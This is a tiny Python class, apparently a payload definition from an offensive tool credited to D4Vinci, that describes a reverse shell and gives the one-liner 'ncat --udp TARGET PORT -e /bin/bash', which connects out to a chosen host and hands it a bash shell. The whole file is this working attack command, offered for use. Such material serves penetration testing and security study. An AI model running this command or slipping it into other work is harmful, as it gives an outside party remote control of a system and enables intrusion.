class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Establish a reverse connection with ncat."
    function    = "reverse shell"
    liner       = "ncat --udp TARGET PORT -e /bin/bash"
